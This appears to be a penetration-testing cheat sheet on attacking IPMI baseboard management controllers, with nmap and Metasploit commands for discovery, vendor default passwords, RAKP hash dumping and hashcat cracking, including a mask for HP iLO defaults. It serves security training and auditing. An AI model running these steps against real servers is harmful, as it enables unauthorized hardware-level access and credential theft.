1. Detect UDP port 623 to identify **Baseboard Management Controllers (BMCs)**.
2. Identify IPMI version; if 2.0, the **RAKP protocol** is vulnerable to hash disclosure.
3. Attempt default credentials based on hardware vendor (Dell, HP, Supermicro).
4. If defaults fail, dump SHA1 or MD5 password hashes for valid users via **RAKP exploitation**.
5. Crack captured hashes offline using Hashcat.

---

## IPMI Footprinting

Searching for management interfaces independent of the host operating system.

Use when port 623 UDP is detected or when auditing hardware-level access via **BMCs** like HP iLO, Dell DRAC, or Supermicro IPMI.

Scan for IPMI version and authentication capabilities

```
sudo nmap -sU --script ipmi-version -p 623 <TARGET_IP>
```

Identify version and supported cipher suites via Metasploit

```
use auxiliary/scanner/ipmi/ipmi_version
set rhosts <TARGET_IP>
run
```

- Nmap → `sudo nmap -sU --script ipmi-version -p 623 <TARGET_IP>` → Prefer for initial discovery and vendor identification.
- Metasploit → `use auxiliary/scanner/ipmi/ipmi_version` → Prefer for detailed authentication property enumeration.

**UDP scanning requirements** must be met for port 623 to respond.

## IPMI Authentication

Accessing the web-based management console, Telnet, or SSH via hardware-specific accounts.

Attempt once a BMC vendor is identified through footprinting.

Manually test vendor-specific default credentials

```
# Dell iDRAC: root / calvin
# HP iLO: Administrator / <RANDOM_8_CHAR_STRING>
# Supermicro IPMI: ADMIN / ADMIN
```

- Unchanged factory default passwords on BMCs.
- Password reuse across BMCs and critical server root accounts.

HP iLO defaults are not static; they use a randomized 8-character string of uppercase letters and numbers.

**Default credentials** may be left unchanged even when the host OS is secured.

## IPMI Hash Retrieval

Exploiting the **RAKP protocol** flaw to force the server to send password hashes.

Use when IPMI 2.0 is running and default credentials fail.

Retrieve SHA1/MD5 hashes for all valid users in a specified list

```
use auxiliary/scanner/ipmi/ipmi_dumphashes
set rhosts <TARGET_IP>
set user_file <FILE_PATH>
run
```

**RAKP protocol** sends salted hashes to the client before authentication is completed.

**Protocol flaw** is inherent to the IPMI 2.0 specification and cannot be patched.

## IPMI Hash Cracking

Offline recovery of passwords from intercepted **RAKP** responses.

Use after successfully dumping hashes from a BMC.

Execute a dictionary attack against captured hashes

```
hashcat -m 7300 <FILE_PATH> <FILE_PATH>
```

Perform a mask attack against HP iLO default password patterns

```
hashcat -m 7300 <FILE_PATH> -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

**Weak password policies** on BMC accounts allow for rapid offline recovery.

> ⚠️ Gap: The source does not provide the specific syntax for the `ipmi_dumphashes` output file variable, though it lists `OUTPUT_HASHCAT_FILE` as an option in the module menu.